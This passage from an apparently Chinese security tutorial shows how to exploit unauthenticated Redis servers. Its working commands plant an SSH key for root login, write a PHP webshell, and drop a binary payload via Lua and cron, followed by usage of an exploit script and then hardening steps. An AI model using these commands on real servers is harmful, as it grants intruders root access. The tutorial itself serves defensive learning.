sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后redis执行命令：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">ssh-keygen -t rsa

(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt
cat foo.txt | redis-cli -h x.x.x.x -x set crackit
redis-cli -h x.x.x.x
 &nbsp; &nbsp; &gt; config set dir /root/.ssh/
 &nbsp; &nbsp; &gt; config get dir
 &nbsp; &nbsp; &gt; config set dbfilename "authorized_keys"
 &nbsp; &nbsp; &gt; save

ssh -i id_rsa root@x.x.x.x</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">或者如下</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">192.168.63.130:6379&gt; config set dir /root/.ssh/
192.168.63.130:6379&gt; config set dbfilename authorized_keys
192.168.63.130:6379&gt; set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n"

192.168.63.130:6379&gt; save</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(3).往web物理路径写webshell</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">192.168.63.130:6379&gt; config set dir /var/www/html/
 &nbsp; &nbsp; &nbsp;192.168.63.130:6379&gt; config set dbfilename shell.php
 &nbsp; &nbsp; &nbsp;192.168.63.130:6379&gt; set x "&lt;?php phpinfo();?&gt;"
 &nbsp; &nbsp; &nbsp;192.168.63.130:6379&gt; save</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">即可将shell写入web目录(web目录根据实际情况</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(4).写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</strong><br  />From:http://www.00theway.org/2017/03/27/redis_exp/<br  />写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">local function hex2bin(hexstr)
 &nbsp; &nbsp;local str = ""
 &nbsp; &nbsp;for i = 1, string.len(hexstr) - 1, 2 do
 &nbsp; &nbsp; &nbsp; &nbsp;local doublebytestr = string.sub(hexstr, i, i+1);
 &nbsp; &nbsp; &nbsp; &nbsp;local n = tonumber(doublebytestr, 16);
 &nbsp; &nbsp; &nbsp; &nbsp;if 0 == n then
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;str = str .. '\00'
 &nbsp; &nbsp; &nbsp; &nbsp;else
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;str = str .. string.format("%c", n)
 &nbsp; &nbsp; &nbsp; &nbsp;end
 &nbsp; &nbsp;end
 &nbsp; &nbsp;return str
end

local dir = redis.call('config','get','dir')
redis.call('config','set','dir','/tmp/')
local dbfilename = redis.call('config','get','dbfilename')
redis.call('config','set','dbfilename','t')
local rdbcompress = redis.call('config','get','rdbcompression')
redis.call('config','set','rdbcompression','no')
redis.call('flushall')

local data = '1a2b3c4d5e6f1223344556677890aa'
redis.call('set','data',hex2bin('0a7c7c7c'..data..'7c7c7c0a'))
local rst = {}
rst[1] = 'server default config'
rst[2] = 'dir:'..dir[2]
rst[3] = 'dbfilename:'..dbfilename[2]
rst[4] = 'rdbcompression:'..rdbcompress[2]
return rst
保存以上代码为a.lua，变量data保存的是程序的16进制编码，执行</code></pre><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">redis-cli <span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 152px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;">--eval a.lua -h *.*.*.*</span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。<br  /></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">redis-cli save -h *.*.*.*
redis-cli config set dir *** -h *.*.*.*
redis-cli config set dbfilename *** -h *.*.*.*
redis-cli config set rdbcompression * -h *.*.*.*</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;white-space: nowrap;background-color: rgba(0, 0, 0, 0.04);border-width: 1px;border-style: solid;border-color: rgb(225, 225, 232);">|||</code>作为提取最终文件的标识）。</p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">*<span class="hljs-default-regexp" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 192px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">/1 * * * * python -c 'open("/</span>tmp/rst<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 20px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">","</span>a+<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 99px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">").write(open("</span>/tmp/t<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 66px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">").read().<span style="color: rgb(221, 17, 68);font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;letter-spacing: 0.75px;text-align: start;background-color: rgba(0, 0, 0, 0.04);">split("|||")[1])'</span></span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">/tmp/rst为最终上传的文件。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(5).傻瓜式python脚本</strong><br  />From:https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">执行命令
需要root权限，每次添加计划任务前先获取服务器时间，然后根据获取的时间设置执行计划任务的时间，确保命令被执行一次，避免多次执行引发服务器异常。
 &nbsp; &nbsp;python redis_exp.py --host *.*.*.* -c 'id'

上传文件
上传携带脏数据的文件不需要root权限，上传二进制文件需要root权限，先上传带有脏数据的文件，在文件前后插入特征字符串，然后添加计划任务截取数据
 &nbsp; &nbsp;python redis_exp.py --host *.*.*.* -l /data/payload.py -r /tmp/p.py

暴力猜解目录
不需要root权限，利用 config set dir 'xx' 报错进行目录猜解
 &nbsp; &nbsp;python redis_exp.py --host *.*.*.* -f p.txt

可以通过-p参数更改默认端口，-t参数更改等待时间</code></pre><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.1971631205673759" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/4_4zRb0LZx0l9Yrf5Ria8vODg4KWLp3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUOmAHM51TrRDSTNuFLKQsBkRaW4zRb0LZx0l9Yrf5Ria8vODg4KWLp3Q/640?wx_fmt=png'" data-type="png" data-w="1410" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.1971631205673759" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/5_gaohD9lm69SKMHyFQ2latShvjdpgTw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUHWdPWse7JgUhdPO10OklgiaTfgaohD9lm69SKMHyFQ2latShvjdpgTw/640?wx_fmt=png'" data-type="png" data-w="1410" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: auto;left: auto;right: auto;bottom: auto;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(6).批量验证</strong><br  />From:https://github.com/Ridter/hackredis</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3.防护措施</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.禁止一些高危命令</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">修改 redis.conf 文件，添加以下内容，来禁用远程修改 DB 文件地址</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">rename-command FLUSHALL ""
 &nbsp; &nbsp; &nbsp;rename-command CONFIG &nbsp; ""
 &nbsp; &nbsp; &nbsp;rename-command EVAL &nbsp; &nbsp; ""</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2.以低权限运行 Redis 服务</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash"> groupadd -r redis &amp;&amp; useradd -r -g redis redis</span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3.为 Redis 添加密码验证</strong><br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">修改 redis.conf 文件，添加<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-attribute" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 72px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">requirepass</span> mypassword</code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>4.禁止外网访问 Redis</strong><br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-selector-tag" style="color: rgb(224, 108, 117);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(224, 108, 117);font-weight: 400;font-style: normal;">bind</span> 127<span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.0</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.0</span><span class="hljs-default-selector-class" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">.1</span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>5.保证 authorized_keys 文件的安全</strong><br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">为了保证安全，您应该阻止其他用户添加新的公钥。<br  />将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">#</span><span class="bash"><span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 225px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;"># chmod 400 ~/.ssh/authorized_keys</span></span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">#</span><span class="bash"><span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 225px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;"># chattr +i ~/.ssh/authorized_keys</span></span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft 